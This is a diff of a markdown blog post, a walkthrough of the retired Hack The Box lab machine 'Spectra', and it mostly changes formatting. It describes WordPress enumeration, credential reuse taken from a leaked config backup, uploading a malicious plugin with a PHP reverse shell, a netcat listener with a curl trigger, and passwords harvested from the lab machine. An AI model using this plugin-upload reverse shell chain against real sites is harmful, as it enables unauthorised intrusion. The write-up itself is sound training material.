@@ -1,24 +1,26 @@
 ---
-date: 2021-06-26 16:00:00
-images: 
-- https://i.imgur.com/KjpVjtL.png
-language: en-US
-localeid:  htb-spectra
-tags:
-- HackTheBox
-- HTB Easy
-- HTB Linux
-- Walktrough
 title: 'Walktrough: HTB Spectra'
-authors: ['default']
+language: en-US
+localeid: htb-spectra
+date: 2021-06-26T16:00:00.000Z
+tags:
+  - HackTheBox
+  - HTB Easy
+  - HTB Linux
+  - Walktrough
+summary: ''
+images:
+  - 'https://i.imgur.com/KjpVjtL.png'
+authors:
+  - default
 ---
 
 Hello guys!
 
 This week's machine will be **Spectra**, another easy-rated box from [Hack The Box](https://www.hackthebox.eu), created by [egre55](https://app.hackthebox.eu/users/1190).
 
-:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
-[info]
+\:information\_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
+\[info]
 
 ![HTB Spectra](https://i.imgur.com/OqO1ZZh.png)
 
@@ -84,8 +86,8 @@ wpscan --url <url> -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugi
 
 The following information was identified for the `main` (*Software Issue Tracking*) website:
 
-- WordPress version: 5.4.2
-- Users: administrator
+* WordPress version: 5.4.2
+* Users: administrator
 
 Proceeding with a manual enumeration, also noticed that for *Testing* website there's no redirect to `index.php`, allowing us to list the directory content, allowing us to spot an interesting file: **`wp-config.php.save`**.
 
@@ -99,9 +101,7 @@ wget http://spectra.htb/testing/wp-config.php.save
 
 Inspecting its content, we can see the credentials for user **devtest**, as listed below:
 
-> Username: devtest
->
-> Password: devteam01
+> Username: devtestPassword: devteam01
 
 ```php
 // ** MySQL settings - You can get this info from your web host ** //
@@ -140,11 +140,11 @@ As credential reuse is a common thing, tried to authenticate to WordPress with t
 
 Once we have access to the WordPress administration console, there are several ways to get a reverse shell with this permission, being the most common the upload of a malicious plugin to it with a web shell or reverse shell payload.
 
-The easiest way would use the [wp_admin_shell_upload](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/webapp/wp_admin_shell_upload.md) module from Metasploit Framework but, if you're preparing for the OSCP exam, where you should wisely choose when to use the msfconsole, using it for this isn't a good idea :smile:.
+The easiest way would use the [wp\_admin\_shell\_upload](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/webapp/wp_admin_shell_upload.md) module from Metasploit Framework but, if you're preparing for the OSCP exam, where you should wisely choose when to use the msfconsole, using it for this isn't a good idea \:smile:.
 
 So, to create this plugin, I have executed the following steps:
 
-- Created a file with the plugin header. This header must follow the minimum requirements as documented on [Header Requirements \| Plugin Developer Handbook \| WordPress Developer Resources](https://developer.wordpress.org/plugins/plugin-basics/header-requirements/). In our case I've created the file `evilplugin.php` with the contents below:
+* Created a file with the plugin header. This header must follow the minimum requirements as documented on [Header Requirements | Plugin Developer Handbook | WordPress Developer Resources](https://developer.wordpress.org/plugins/plugin-basics/header-requirements/). In our case I've created the file `evilplugin.php` with the contents below:
 
 ```php
 /**
@@ -156,7 +156,7 @@ So, to create this plugin, I have executed the following steps:
   */
 ```
 
-- Create another file with the desired payload. In this case, as my objective is to directly get a reverse shell, made a copy of [Pentest Monkey's PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), changing the details to my IP address and port, saving it as `exploit.php`.
+* Create another file with the desired payload. In this case, as my objective is to directly get a reverse shell, made a copy of [Pentest Monkey's PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), changing the details to my IP address and port, saving it as `exploit.php`.
 
 ```php
 // Usage
@@ -174,35 +174,35 @@ $daemon = 0;
 $debug = 0;
 ```
 
-- Compress the file as below, where the file name must be the same as the plugin header with the zip extension.
+* Compress the file as below, where the file name must be the same as the plugin header with the zip extension.
 
 ```bash
 $ zip evilplugin.zip evilplugin.php exploit.php
   adding: evilplugin.php (deflated 9%)
   adding: exploit.php (deflated 59%)
 ```
-  
-- Once created, accessed the WordPress portal, authenticated with the administrative account and, from the left side, selected the options *Plugins* > *Add New* and, at the top of the page, hit the button *Upload Plugin*
+
+* Once created, accessed the WordPress portal, authenticated with the administrative account and, from the left side, selected the options *Plugins* > *Add New* and, at the top of the page, hit the button *Upload Plugin*
 
 ![HTB Spectra - Upload evilplugin.zip](https://i.imgur.com/UlBkZNE.png)
 
-- Initialize the listener according to the configured payload. In our case, I've started a `netcat` listener using the command line below
+* Initialize the listener according to the configured payload. In our case, I've started a `netcat` listener using the command line below
 
 ```bash
 nc -lnvp 4443
 ```
 
-- Selected the zip file and hit the button *Install Now*
+* Selected the zip file and hit the button *Install Now*
 
 ![HTB Spectra - Installed evilplugin.zip](https://i.imgur.com/sNlvuWi.png)
 
-- As soon as the install request is processed, is important to issue the request to the file location under the WordPress folder structure. The command line below uses `curl` to make the request, but you could use your browser as well.
+* As soon as the install request is processed, is important to issue the request to the file location under the WordPress folder structure. The command line below uses `curl` to make the request, but you could use your browser as well.
 
 ```bash
 curl -L http://spectra.htb/main/wp-content/plugins/evilplugin/exploit.php
 ```
 
-After this process, we should receive a connection from the victim machine, we below: :smiley:
+After this process, we should receive a connection from the victim machine, we below: \:smiley:
 
 ```bash
 $ nc -lnvp 4443
@@ -218,25 +218,23 @@ uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
 nginx@spectra / $
 ```
 
-:bulb: **Tip:** There are several ways to achieve the same outcome not using the Metasploit framework. You could inject code into a Theme file or even use other scripts/tools available like [n00py/WPForce: WordPress Attack Suite (github.com)](https://github.com/n00py/WPForce), which automates this and other tasks frequently used while compromising WordPress sites.
-[info]
+\:bulb: **Tip:** There are several ways to achieve the same outcome not using the Metasploit framework. You could inject code into a Theme file or even use other scripts/tools available like [n00py/WPForce: WordPress Attack Suite (github.com)](https://github.com/n00py/WPForce), which automates this and other tasks frequently used while compromising WordPress sites.
+\[info]
 
 ## User flag
 
 After the initial access, initiated the machine enum using `linpeas.sh`, where the following details were identified:
 
-- User: **nginx**, without any special privileges (`uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)`)
-
-- Operating System: **Chromium OS 11**.0_pre399094_p20200824-r6
-
-- Content published using Nginx from `/usr/local/share/nginx/html` directory, vide file path of `wp-config.php` files, where the creds below were also harvested:
+* User: **nginx**, without any special privileges (`uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)`)
+* Operating System: **Chromium OS 11**.0\_pre399094\_p20200824-r6
+* Content published using Nginx from `/usr/local/share/nginx/html` directory, vide file path of `wp-config.php` files, where the creds below were also harvested:
 
 | site    | Username | Password      |
 | ------- | -------- | ------------- |
 | main    | dev      | development01 |
 | testing | devtest  | devteam01     |
 
-- Users with console access, being a possible elevation path, as well as their privileges:
+* Users with console access, being a possible elevation path, as well as their privileges:
 
 ```plaintext
 [+] Users with console
@@ -248,9 +246,8 @@ uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
 uid=1001(chronos-access) gid=1001(chronos-access) groups=1001(chronos-access)
 ```
 
-- MySQL  Ver 14.14 Distrib 5.7.20-19, for Linux (x86_64) using  6.3
-
-- Possible SSH keys
+* MySQL  Ver 14.14 Distrib 5.7.20-19, for Linux (x86\_64) using  6.3
+* Possible SSH keys
 
 ```plaintext
 /usr/share/chromeos-ssh-config/keys/authorized_keys
@@ -258,7 +255,7 @@ uid=1001(chronos-access) gid=1001(chronos-access) groups=1001(chronos-access)
 /usr/share/chromeos-ssh-config/keys/id_rsa.pub
 ```
 
-- Uncommon passwd files, being one of them for **autologin** containing the password **SummerHereWeCome!!**
+* Uncommon passwd files, being one of them for **autologin** containing the password **SummerHereWeCome!!**
 
 ```plaintext
 [+] Searching uncommon passwd files (splunk)
@@ -271,9 +268,9 @@ passwd file: /usr/share/baselayout/passwd
 SummerHereWeCome!!
 ```
 
-- File `user.txt` at **katie**'s home path, seen from a manual enumeration.
+* File `user.txt` at **katie**'s home path, seen from a manual enumeration.
 
-Once we have found some passwords, decided to test them for users `katie` and `chronos`, being successful with the combination **katie:SummerHereWeCome!!**
+Once we have found some passwords, decided to test them for users `katie` and `chronos`, being successful with the combination **katie\:SummerHereWeCome!!**
 
 With access to this profile, got the user flag in her home directory
 
@@ -403,4 +400,4 @@ root
 
 I hope you guys have enjoyed it!
 
-See you in the next post :smiley:
+See you in the next post \:smiley:
